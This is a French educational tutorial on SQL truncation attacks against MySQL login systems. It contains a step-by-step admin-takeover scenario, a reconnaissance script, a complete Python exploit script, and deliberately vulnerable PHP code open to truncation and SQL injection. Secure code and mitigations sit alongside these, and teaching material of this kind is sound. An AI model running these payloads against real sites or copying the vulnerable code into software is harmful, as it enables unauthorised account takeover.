# 🗄️ SQL TRUNCATION — Guide Complet

> **Par exploit4040 | Cybersécurité Éducative**

---

## 📌 Table des Matières

1. [Introduction](#introduction)
2. [Comprendre les bases](#comprendre-les-bases)
3. [Comment MySQL gère les chaînes](#comment-mysql-gère-les-chaînes)
4. [La vulnérabilité expliquée](#la-vulnérabilité-expliquée)
5. [Scénario d'attaque pas à pas](#scénario-dattaque-pas-à-pas)
6. [Code vulnérable vs Code sécurisé](#code-vulnérable-vs-code-sécurisé)
7. [Exploitation CTF](#exploitation-ctf)
8. [Détection & Mitigation](#détection--mitigation)
9. [Ressources](#ressources)

---

## 1. Introduction

Le **SQL Truncation** (ou troncature SQL) est une vulnérabilité souvent sous-estimée, absente des tops OWASP classiques, mais redoutablement efficace dans des contextes réels et des challenges CTF.

Elle ne repose **pas sur une injection SQL classique**. Pas de `' OR 1=1 --`. Ici, on exploite simplement le comportement interne de MySQL face aux chaînes trop longues.

> 💡 **Principe fondamental :** MySQL tronque silencieusement une chaîne qui dépasse la taille d'une colonne `VARCHAR(n)` — sans lever d'erreur — puis ignore les espaces en fin de chaîne lors des comparaisons.

---

## 2. Comprendre les Bases

### 2.1 Qu'est-ce qu'un VARCHAR ?

En SQL, `VARCHAR(n)` est un type de données pour stocker du texte de longueur variable, avec un maximum de `n` caractères.

```sql
CREATE TABLE users (
    id       INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(20),   -- maximum 20 caractères
    password VARCHAR(255),
    role     VARCHAR(10) DEFAULT 'user'
);
```

Si tu essaies d'insérer une chaîne de 30 caractères dans un `VARCHAR(20)` :

| Comportement | Ce qui se passe |
|---|---|
| **Mode strict OFF** | MySQL tronque à 20 chars sans erreur ⚠️ |
| **Mode strict ON** | MySQL lève une erreur et rejette ✅ |

### 2.2 Le problème des espaces trailing

MySQL, lors d'une comparaison `WHERE`, **ignore les espaces en fin de chaîne** :

```sql
SELECT 'admin' = 'admin   ';  -- Retourne : 1 (TRUE) ✅
SELECT 'admin' = 'admin x';   -- Retourne : 0 (FALSE) ❌
```

C'est un comportement **conforme au standard SQL-92**, pas un bug MySQL — mais c'est précisément ce qui rend cette attaque possible.

---

## 3. Comment MySQL Gère les Chaînes

### 3.1 Flux normal d'une insertion

```
Données utilisateur  →  Validation app  →  Requête SQL  →  MySQL  →  Base de données
```

### 3.2 Ce qui se passe sans mode strict

```
"admin               x"  (25 chars)
         ↓
MySQL voit : VARCHAR(20)
         ↓
Tronque à 20 chars → "admin              " (admin + 15 espaces)
         ↓
Stocke en base sans erreur ⚠️
```

### 3.3 Vérification rapide du mode SQL actif

```sql
-- Vérifier le mode actuel
SELECT @@sql_mode;

-- Résultat dangereux (mode non strict) :
-- ""  ou  "NO_ENGINE_SUBSTITUTION"

-- Résultat sécurisé :
-- "STRICT_TRANS_TABLES,..."
```

---

## 4. La Vulnérabilité Expliquée

### 4.1 Schéma de la base vulnérable

```sql
CREATE TABLE users (
    id       INT AUTO_INCREMENT PRIMARY KEY,
    username VARCHAR(20),
    password VARCHAR(255),
    role     VARCHAR(10) DEFAULT 'user'
);

-- Compte admin existant en base
INSERT INTO users (username, password, role)
VALUES ('admin', MD5('SuperSecret!'), 'admin');
```

### 4.2 Visualisation de l'état de la base

```
+----+----------------------+----------------------------------+-------+
| id | username             | password                         | role  |
+----+----------------------+----------------------------------+-------+
|  1 | admin                | 7f3d...                          | admin |
+----+----------------------+----------------------------------+-------+
```

### 4.3 Ce que l'attaquant envoie à l'inscription

```
username : "admin               x"
            \_____/\____________/\_/
             admin   15 espaces   x  → total = 21 chars
password : "hacked123"
```

### 4.4 Ce que MySQL stocke

```
+----+----------------------+----------------------------------+-------+
| id | username             | password                         | role  |
+----+----------------------+----------------------------------+-------+
|  1 | admin                | 7f3d... (vrai hash)              | admin |
|  2 | admin               | hash("hacked123")                | user  |
+----+----------------------+----------------------------------+-------+
         ↑
     Tronqué à 20 chars = "admin" + 15 espaces
```

### 4.5 Lors de la connexion

L'application exécute :

```sql
SELECT * FROM users WHERE username = 'admin' AND password = MD5('hacked123');
```

Selon comment la query est construite et quel résultat est retourné, l'attaquant peut :
- Tomber sur **sa propre ligne** (id=2) avec son mot de passe → connexion réussie
- Si l'app fait `LIMIT 1` sans `ORDER BY id`, il peut aussi récupérer la ligne admin

---

## 5. Scénario d'Attaque Pas à Pas

### 🎯 Objectif : Accéder au compte admin

#### Étape 1 — Reconnaissance

Identifier la longueur maximale du champ `username` :
- Tester des usernames de longueurs croissantes
- Observer si l'app tronque ou retourne une erreur
- Un champ limité à 20 chars sans erreur = potentiellement vulnérable

```python
import requests

url = "http://target.com/register"

for length in range(15, 30):
    payload = {
        "username": "A" * length,
        "password": "test"
    }
    r = requests.post(url, data=payload)
    print(f"[{length} chars] → Status: {r.status_code} | Réponse: {r.text[:80]}")
```

#### Étape 2 — Identifier le compte cible

```
Comptes typiques à cibler :
- admin
- administrator
- root
- superuser
- support
```

#### Étape 3 — Construire le payload

```
username_cible = "admin"  (5 chars)
limite_colonne = 20 chars
padding_needed = 20 - 5 = 15 espaces
payload        = "admin" + " " * 15 + "x"  → 21 chars
```

Le `x` final force la chaîne à dépasser la limite pour déclencher la troncature.

#### Étape 4 — Enregistrement

```
POST /register
username=admin               x&password=hacked123
```

Le serveur insère → MySQL tronque → `"admin               "` est stocké.

#### Étape 5 — Connexion

```
POST /login
username=admin&password=hacked123
```

→ Si la query retourne l'id=2 → tu es connecté avec des privilèges potentiellement élevés.

---

## 6. Code Vulnérable vs Code Sécurisé

### ❌ Code PHP Vulnérable

```php
<?php
// register.php

$username = $_POST['username'];  // Aucune validation ❌
$password = md5($_POST['password']);

// Pas de vérification de doublon avant insertion ❌
$sql = "INSERT INTO users (username, password) VALUES ('$username', '$password')";
$conn->query($sql);

echo "Compte créé !";
?>
```

```php
<?php
// login.php

$username = $_POST['username'];
$password = md5($_POST['password']);

// LIMIT 1 sans ORDER BY → retourne n'importe quelle ligne ❌
$sql = "SELECT * FROM users WHERE username='$username' AND password='$password' LIMIT 1";
$result = $conn->query($sql);

if ($result->num_rows > 0) {
    $user = $result->fetch_assoc();
    $_SESSION['role'] = $user['role'];  // Peut être 'admin' ❌
    echo "Bienvenue " . $user['username'];
}
?>
```

### ✅ Code PHP Sécurisé

```php
<?php
// register.php — VERSION SÉCURISÉE

$username = trim($_POST['username']);  // Supprime les espaces ✅

// Validation stricte de la longueur ✅
if (strlen($username) > 20) {
    die("Nom d'utilisateur trop long.");
}

// Validation du format ✅
if (!preg_match('/^[a-zA-Z0-9_]{3,20}$/', $username)) {
    die("Format de nom d'utilisateur invalide.");
}

$password = password_hash($_POST['password'], PASSWORD_BCRYPT);

// Vérification doublon AVANT insertion ✅
$stmt = $conn->prepare("SELECT id FROM users WHERE username = ?");
$stmt->bind_param("s", $username);
$stmt->execute();
$stmt->store_result();

if ($stmt->num_rows > 0) {
    die("Ce nom d'utilisateur existe déjà.");
}

// Insertion sécurisée avec requête préparée ✅
$stmt = $conn->prepare("INSERT INTO users (username, password) VALUES (?, ?)");
$stmt->bind_param("ss", $username, $password);
$stmt->execute();

echo "Compte créé avec succès.";
?>
```

```sql
-- Côté base de données : ajouter une contrainte UNIQUE ✅
ALTER TABLE users ADD UNIQUE KEY unique_username (username);

-- Activer le mode strict ✅
SET GLOBAL sql_mode = 'STRICT_TRANS_TABLES,NO_ENGINE_SUBSTITUTION';
```

---

## 7. Exploitation CTF

### 7.1 Script Python d'exploitation automatisée

```python
#!/usr/bin/env python3
"""
SQL Truncation Exploit Script
Auteur  : exploit4040
But     : Éducatif — CTF & Lab uniquement
"""

import requests
import sys

# ─── CONFIG ─────────────────────────────────────────────────────────────────
TARGET      = "http://localhost/vulnerable-app"
TARGET_USER = "admin"
MY_PASSWORD = "hacked123"
COL_LENGTH  = 20  # Longueur de la colonne VARCHAR
# ────────────────────────────────────────────────────────────────────────────

BANNER = """
╔══════════════════════════════════════╗
║   SQL TRUNCATION EXPLOIT             ║
║   github.com/exploit4040             ║
║   ⚠️  USAGE ÉDUCATIF UNIQUEMENT      ║
╚══════════════════════════════════════╝
"""

def build_payload(target_user: str, col_length: int) -> str:
    """Construit le payload de troncature."""
    padding = col_length - len(target_user)
    return target_user + (" " * padding) + "x"

def register(session: requests.Session, username: str, password: str) -> bool:
    print(f"[*] Tentative d'inscription avec : '{username}'")
    print(f"[*] Longueur du payload          : {len(username)} chars")

    r = session.post(f"{TARGET}/register", data={
        "username": username,
        "password": password
    })

    if r.status_code == 200 and "créé" in r.text.lower():
        print("[+] Inscription réussie — troncature effectuée en base ✅")
        return True
    else:
        print(f"[-] Inscription échouée : {r.status_code}")
        print(f"    Réponse : {r.text[:200]}")
        return False

def login(session: requests.Session, username: str, password: str) -> bool:
    print(f"\n[*] Tentative de connexion avec : '{username}' / '{password}'")

    r = session.post(f"{TARGET}/login", data={
        "username": username,
        "password": password
    })

    if "admin" in r.text.lower() or "dashboard" in r.text.lower():
        print("[+] CONNEXION RÉUSSIE — Accès admin obtenu ! 🎉")
        print(f"    Réponse : {r.text[:300]}")
        return True
    else:
        print("[-] Connexion échouée.")
        return False

def main():
    print(BANNER)

    session = requests.Session()

    # Étape 1 : Construire le payload
    payload = build_payload(TARGET_USER, COL_LENGTH)
    print(f"[*] Payload construit : '{payload}'")

    # Étape 2 : S'inscrire avec le payload
    if not register(session, payload, MY_PASSWORD):
        sys.exit(1)

    # Étape 3 : Se connecter avec le vrai username
    login(session, TARGET_USER, MY_PASSWORD)

if __name__ == "__main__":
    main()
```

### 7.2 Exemple de résultat attendu

```
╔══════════════════════════════════════╗
║   SQL TRUNCATION EXPLOIT             ║
║   github.com/exploit4040             ║
║   ⚠️  USAGE ÉDUCATIF UNIQUEMENT      ║
╚══════════════════════════════════════╝

[*] Payload construit : 'admin               x'
[*] Tentative d'inscription avec : 'admin               x'
[*] Longueur du payload          : 21 chars
[+] Inscription réussie — troncature effectuée en base ✅

[*] Tentative de connexion avec : 'admin' / 'hacked123'
[+] CONNEXION RÉUSSIE — Accès admin obtenu ! 🎉
```

---

## 8. Détection & Mitigation

### 8.1 Détection côté pentest

| Indicateur | Signification |
|---|---|
| Champ accepte des entrées longues sans erreur | Mode strict désactivé |
| Pas de contrainte UNIQUE en base | Doublons possibles |
| `LIMIT 1` sans `ORDER BY id ASC` | Retour de ligne aléatoire |
| `md5()` ou `sha1()` pour les mots de passe | Mauvaises pratiques globales |

### 8.2 Checklist de mitigation complète

```
✅ Activer STRICT_TRANS_TABLES dans MySQL
✅ Ajouter une contrainte UNIQUE sur les colonnes sensibles
✅ Valider et trimmer les entrées côté application
✅ Utiliser des requêtes préparées (PDO / MySQLi)
✅ Utiliser password_hash() / bcrypt au lieu de MD5
✅ ORDER BY id ASC + LIMIT 1 dans les queries de login
✅ Vérifier les doublons AVANT l'insertion
✅ Logger les tentatives d'inscription avec usernames longs
```

### 8.3 Vérification rapide de la config MySQL

```sql
-- Vérifier si le mode strict est actif
SHOW VARIABLES LIKE 'sql_mode';

-- Vérifier les contraintes UNIQUE d'une table
SHOW CREATE TABLE users;

-- Lister les index UNIQUE
SHOW INDEX FROM users WHERE Non_unique = 0;
```

---

## 9. Ressources

```
📚 Références :
- CVE associés : rechercher "SQL truncation authentication bypass"
- CWE-20  : Improper Input Validation
- CWE-521 : Weak Password Requirements

🧪 Labs pour pratiquer :
- DVWA (Damn Vulnerable Web Application)
- WebGoat
- Root Me : https://www.root-me.org
- HackTheBox

📖 Pour aller plus loin :
- MySQL Docs — String Comparison Functions
- OWASP Testing Guide v4.2
- PortSwigger Web Security Academy
```

---

```
┌─────────────────────────────────────────────────────────┐
│  ⚠️  AVERTISSEMENT LÉGAL                                │
│                                                         │
│  Ce guide est fourni à des fins ÉDUCATIVES uniquement.  │
│  Toute utilisation sur des systèmes sans autorisation   │
│  explicite est ILLÉGALE et contraire à l'éthique.       │
│                                                         │
│  Pratiquez uniquement sur des labs personnels,          │
│  des CTF officiels, ou avec une autorisation écrite.    │
└─────────────────────────────────────────────────────────┘

  github.com/exploit4040 | Cybersécurité Éducative 🔐
```

---

 
